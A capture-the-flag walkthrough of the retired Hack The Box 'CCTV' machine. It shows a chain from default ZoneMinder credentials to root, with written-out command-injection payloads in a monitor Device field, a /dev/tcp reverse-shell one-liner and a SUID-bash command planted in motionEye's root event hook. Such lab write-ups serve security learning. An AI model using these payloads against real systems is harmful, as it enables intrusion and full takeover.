# CCTV — Hack The Box (retired)

**Easy · Linux**

*Flag values redacted; target/VPN addresses generalised.*

## Recon

Two ports: `22` (OpenSSH 9.6p1, Ubuntu 24.04) and `80` (Apache 2.4.58). Port 80
redirects the bare IP to `http://cctv.htb/` — a static "SecureVision" CCTV
brochure whose only live link, "Staff Login", points at **`/zm`** = a
**ZoneMinder** install.

## Pinning the version (without a version endpoint)

`getVersion.json` needs auth, and no page prints a version. I fingerprinted it
by cloning upstream ZoneMinder and hash-bisecting served static assets
(`skin.js`, `skin.css`, `console.css`) against every tag — only **1.37.63**
matched all three. (It later self-confirmed once authenticated.)

The ajax layer answers **unauthenticated** for a surprising number of
`index.php?request=<handler>` calls (they return JSON, not the 401 the view
layer gives) — good to know, but the real opener was simpler.

## Foothold: default creds → authenticated command injection

`admin:admin` — the ZoneMinder product default — logs straight in.

`admin` doesn't have `System=Edit`, so the obvious `shutdown`/options exec paths
are closed. Reading the 1.37.63 source for reachable sinks, the winner is
`web/ajax/modals/settings.php`:

```php
$ctls = shell_exec('v4l2-ctl -d '.$monitor->Device().' --list-ctrls');
```

`Monitor->Device()` is attacker-controlled (I can create monitors) and totally
unescaped. So:

1. `POST /zm/api/monitors.json` with `Monitor[Device] = /dev/video0; <cmd> ; #`
2. `GET /zm/index.php?request=modal&modal=settings&mid=<id>` — the modal calls
   `shell_exec` and my command runs.

A `curl` back to my listener returned uid **33 (www-data)**. I fed a
`bash -i >& /dev/tcp/…` one-liner the same way for an interactive shell.
(`references/web.md` pattern: version-pin → read the source for the exact sink →
deliver into the field that reaches it.)

## www-data → mark

`/etc/zm/conf.d/*.conf` gives the DB creds `zmuser:zmpass`. Dumping the `Users`
table yields three bcrypt hashes; `mark`'s cracks to **`opensesame`** in seconds
with rockyou. That password is reused for the **system** account — `ssh
mark@…` lands a real user shell. (Password reuse remains the most productive
single move in this lab.)

`mark` can't `sudo`, and `user.txt` lives in `sa_mark`'s home (unreadable). A
`/opt/video/backups/server.log` logs a monitoring loop "Authorization as sa_mark
… command issued: status/disk-info" every ~40 s — a red herring pointing at a
containerised agent I never needed.

## mark → root: motionEye's signing key is a readable file

`/proc/net/tcp` shows the whole localhost media stack — motionEye `:8765`,
motion `:7999`, mediamtx — all owned by **UID 0 (root)**. motionEye's
`/config/list` is served without auth; `set`/`add` return 403 (they want a
signed request).

Reading `handlers/base.py`, a request is authenticated as admin when its
`_signature` equals:

```python
utils.compute_signature(method, uri, body, admin_hash)   # admin_hash = sha1(@admin_password)
# …or…
utils.compute_signature(method, uri, body, admin_password)
```

and `compute_signature` is just `sha1("METHOD:path:body:KEY")`. The catch that
makes this trivial: `@admin_password` in `/etc/motioneye/motion.conf` is **already
stored as the SHA-1 hex** and the file is world-readable
(`989c5a8e…`). So the signing key is a value I can just *read* — no cracking.

With forged admin signatures I:

1. pulled camera 1's config from the (unauthenticated) `/config/list`,
2. set `command_notifications_enabled=true` and
   `command_notifications_exec = cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash`
   — motionEye appends this to motion's `on_event_start` (runs as root),
3. `POST /config/1/set` (signed) → 200,
4. fired it synchronously with motion's own webcontrol:
   `GET http://127.0.0.1:7999/1/action/eventstart`.

`on_event_start` executed as root and left a SUID `/tmp/rootbash`. `rootbash -p`
→ euid 0 → both flags.

## Leads that went nowhere
- ZoneMinder CVE-2024-51482 (SQLi in `event.php`, affects ≤1.37.64) and
  CVE-2025-65791 (`image.php` injection) — real for this version but the
  default-cred + `settings.php` sink was the faster, intended door.
- The `sa_mark` "command server" and the containerised motion/mediamtx internals
  — designed to look like the privesc; the actual privesc was the readable
  motionEye signing key on the host.

## Chain in one line
Default ZM creds → `Device` command injection (www-data) → reused DB-cracked
password (mark) → forge motionEye admin signature from a world-readable hash →
inject into root's `on_event_start` → root.
